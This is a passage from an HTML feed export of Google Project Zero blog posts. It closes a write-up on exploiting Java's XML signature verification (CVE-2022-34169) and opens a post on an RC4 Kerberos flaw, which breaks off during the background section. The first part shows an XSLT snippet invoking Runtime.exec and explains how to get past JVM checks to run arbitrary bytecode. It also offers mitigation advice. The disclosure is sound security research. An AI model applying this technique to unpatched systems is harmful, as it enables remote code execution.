white-space: pre-wrap;">Attribute [0]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">name_index 0x0600</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">length 0x00000004</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">data &nbsp; \x00\x00\x00\x06</span></p></td></tr><tr style="height: 20pt;"><td style="background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Attribute [1]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">name_index 0xCCDD -&gt; Code</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #0d904f; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">length 0xZZZZZZZZ</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #c53929; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">data&nbsp; PAYLOAD</span></p></td></tr><tr style="height: 20pt;"><td style="background-color: #c9daf8; border-bottom: solid #000000 1pt; border-left: solid #000000 1pt; border-right: solid #000000 1pt; border-top: solid #000000 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 8pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">Attribute [2] ...</span></p></td></tr></tbody></table></div><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">We still need to bypass one limitation: JVM bytecode does not work standalone, but references and relies on entries in the constant pool. Instantiating a class or calling a method requires a corresponding constant entry in the pool. This is a problem as our bug doesnt give us the ability to create fake constant pool entries so we are limited to constants that XSLTC adds during compilation.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Luckily, there is a way to add arbitrary class and method references to the constant pool: Javas XSLT runtime supports calling arbitrary Java methods. As this is clearly insecure, this functionality is protected by a runtime setting and always disabled during signature verification.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">However, XSLTC will still process and compile these function calls when processing a stylesheet and the call will only be blocked during runtime (see the corresponding code in </span><a href="https://github.com/openjdk/jdk/blob/aff5ff14b208b3c2be93d7b4fab8b07c5be12f3e/src/java.xml/share/classes/com/sun/org/apache/xalan/internal/xsltc/compiler/FunctionCall.java#L787" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">FunctionCall.java</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">). This means that we can get references to all required methods and classes by adding a XSLT element like the one shown below:</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;xsl:value-of</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> select</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"rt:exec(rt:getRuntime(),'...')" xmlns:rt</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">"java.lang.Runtime"</span><span style="background-color: transparent; color: #00796b; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span></p></td></tr></tbody></table></div><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">There are two final checks we need to bypass, before we end up with a working class file:</span></p><ul style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The JVM enforces that every constructor of a subclass, calls a superclass constructor before returning. This check can be bypassed by never returning from our constructor either by adding an endless loop at the end or throwing an exception, which is the approach I used in my exploit Proof-of-Concept. A slightly more complex, but cleaner approach is to add a reference to the AbstractTranslet constructor to the object pool and call it. This is the approach used by thanat0s in their </span><a href="https://noahblog-360-cn.translate.goog/xalan-j-integer-truncation-reproduce-cve-2022-34169/?_x_tr_sch=http&amp;_x_tr_sl=auto&amp;_x_tr_tl=en&amp;_x_tr_hl=de&amp;_x_tr_pto=wapp" style="text-decoration-line: none;"><span style="color: #1155cc; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">exploit writeup</span></a><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Finally, we need to skip over the rest of XSLTCs output. This can be done by constructing a single large attribute with the right size as an element in the class attribute table.</span></p></li></ul><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Once we chain all of this together we end up with a signed XML document that can trigger the execution of arbitrary JVM bytecode during signature verification. Ive skipped over some implementation details of this exploit, so if you want to reproduce this vulnerability please take a look at the heavily commented&nbsp; </span><a href="https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=553654" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">proof-of-concept</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> script.</span></p><br /><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Impact and Restrictions</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">In theory every unpatched Java application that processes XML signatures is vulnerable to this exploit. However, there are two important restrictions:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">As references are only processed after the signature of the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SignedInfo</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> element is verified, applications can be protected based on their usage of the </span><a href="https://docs.oracle.com/en/java/javase/18/security/java-xml-digital-signature-api-overview-and-tutorial.html#GUID-26946ED1-1BBE-4AFD-B1CA-5A6A46FD7354:~:text=validity%20status%3A%20%22%20%2B%20refValid)%3B%0A%20%20%20%20%7D-,Using%20KeySelectors,-KeySelectors%20are" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">KeySelector</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> class. Applications that use a allowlist of trusted keys in their </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KeySelector</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> will be protected as long as these keys are not compromised. An example of this would be a single-tenant SAML SP configured with a single trusted IdP key. In practice, a lot of these applications are still vulnerable as they dont use </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KeySelector</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> directly and will instead enforce this restriction in their own application logic after an unrestricted signature validation. At this point the vulnerability has already been triggered. Multi-tenant SAML applications that support customer-provided Identity Providers, as most modern cloud SaaS do, are also not protected by this limitation.</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">SAML Identity Providers can only be attacked if they support (and verify) signed SAML requests.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Even without CVE-2022-34169, processing XSLT during signature verification can be easily abused as part of a DoS attack. For this reason, the property </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">org.jcp.xml.dsig.secureValidation</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> can be enabled to forbid XSLT transformation in XML signatures. Interestingly this property defaults to false for all JDK versions &lt;17, if the application is not running under the Java security manager. As the Security Manager is rarely used for server side applications and JDK 17 was only released a year ago, we expect that a lot of applications are not protected by this. Limited testing of large java-based SSO providers confirmed this assumption. Another reason for a lack of widespread usage might be that </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">org.jcp.xml.dsig.secureValidation</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> also disables use of the SHA1 algorithm in newer JDK versions. As SHA1 is still widely used by enterprise customers, simply enabling the property without manually configuring a suitable </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">jdk.xml.dsig.secureValidationPolicy</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> might not be feasible.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Conclusion</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">XML signatures in general and SAML in particular offer a large and complex attack surface to external attackers. Even though Java offers configuration options that can be used to address this vulnerability, they are complex, might break real-world use cases and are off by default.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Developers that rely on SAML should make sure they understand the risks associated with it and should reduce the attack surface as much as possible by disabling functionality that is not required for their use case. Additional defense-in-depth approaches like early validation of signing keys, an allow-list based approach to valid transformation chains and strict schema validation of SAML tickets can be used for further hardening.</span></p><br /></span>

## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/8124034966884170870/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/11/gregor-samsa-exploiting-java-xml.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8124034966884170870
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/8124034966884170870
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2022/11/gregor-samsa-exploiting-java-xml.html
## @title
Gregor Samsa: Exploiting Java's XML Signature Verification
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-8303427457754488503
## published
27/10/2022 16:48:00
## updated
17/01/2023 20:16:06
## title
## @type
text
## #text
RC4 Is Still Considered Harmful
## content
## @type
html
## #text



<p><span style="font-family: Arial; font-size: 11pt; white-space: pre-wrap;">By James Forshaw, Project Zero</span></p><span id="docs-internal-guid-17a9c8ad-7fff-5625-1f43-45ab13f83d8f"><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">I've been spending a lot of time researching Windows authentication implementations, specifically Kerberos. In June 2022 I found an interesting issue number </span><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2310" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">2310</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> with the handling of RC4 encryption that allowed you to authenticate as another user if you could either interpose on the Kerberos network traffic to and from the KDC or directly if the user was configured to disable typical pre-authentication requirements.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This blog post goes into more detail on how this vulnerability works and how I was able to exploit it with only a bare minimum of brute forcing required. Note, I'm not going to spend time fully explaining how Kerberos authentication works, there's plenty of resources online. For example </span><a href="https://syfuhs.net/a-bit-about-kerberos" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">this blog post</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> by </span><a href="https://twitter.com/SteveSyfuhs" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">Steve Syfuhs</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> who works at Microsoft is a good first start.</span></p><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Background</span></h2><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Kerberos is a very old authentication protocol. The current version (v5) was described in </span><a href="https://datatracker.ietf.org/doc/html/rfc1510" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">RFC1510</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> back in 1993, although it was updated in </span><a href="https://datatracker.ietf.org/doc/html/rfc4120" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">RFC4120</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> in 2005. As Kerberos' core security concept is using encryption to prove knowledge of a user's credentials the design allows for negotiating the encryption and checksum algorithms that the client and server will use.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">For example when sending the initial authentication service request (AS-REQ) to the Key Distribution Center (KDC) a client can specify a list supported encryption algorithms, as predefined integer identifiers, as shown below in the snippet of the ASN.1 definition from RFC4120.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">KDC-REQ-BODY&nbsp; &nbsp; ::= SEQUENCE {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">...</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;etype&nbsp; &nbsp; [8] SEQUENCE OF Int32 -- EncryptionType</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-- in preference order --,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">...</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">When the server receives the request it checks its list of supported encryption types and the ones the user's account supports (which is based on what keys the user has configured) and then will typically choose the one the client most preferred. The selected algorithm is then used for anything requiring encryption, such as generating session keys or the </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">EncryptedData </span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">structure as shown below:</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">EncryptedData &nbsp; ::= SEQUENCE {</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;etype &nbsp; [0] Int32 -- EncryptionType --,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;kvno&nbsp; &nbsp; [1] UInt32 OPTIONAL,</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cipher&nbsp; [2] OCTET STRING -- ciphertext</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;Courier New&quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The KDC will send back an authentication service reply (AS-REP) structure containing the user's </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Ticket Granting Ticket</span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> (TGT) and an </span><span style="font-family: Arial; font-size: 11pt; font-style: italic; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">EncryptedData </span><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">structure which contains the session key necessary to use the TGT to request service tickets. The user can then use their known key which corresponds to the requested encryption algorithm to decrypt the session key and complete the authentication process.</span></p><br />
 
<a href='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s1062/image5.png' style='display: block; padding: 1em 0; text-align: center;'><img src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRE6Kj-svyxGDL8OhnPM46jhk7cf3JEJrssrRSwToM3q63wAaqtboIVHeEiZ5bONQoHZNapfdxpDr3kXMbxLakja1tqshef6N4GDNlw1BXyhanRY_Jg2zDqTlIPmHZBZ2XvCMf_23GXoRSS-18_zLCfwYV2v4xOR5usrM4zq1AONy2U57oCk-n-BpW/s1062/image5.png' alt="Alt Text: Diagram showing the based Kerberos authentication and requesting an AES key type." title="Alt Text: Diagram showing the based Kerberos authentication and requesting an AES key type." border='0' style='max-height: 750px; max-width: 600px;' /></a>

<br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">This flexibility in selecting an encryption algorithm is both a blessing and a curse. In the original implementations of Kerberos only DES encryption was supported, which by modern standards is far too weak. Because of the flexibility developers were able to add support for AES through </span><a href="https://datatracker.ietf.org/doc/html/rfc3962" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;">RFC3962</span></a><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> which is supported by all modern versions of Windows. This can then be negotiated between client and server to use the best algorithm both support. However, unless weak algorithms are explicitly disabled there's nothing stopping a malicious client or server from downgrading the encryption algorithm in use and trying to break Kerberos using cryptographic attacks.</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Modern versions of Windows have started to disable DES as a supported encryption algorithm, preferring AES. However, 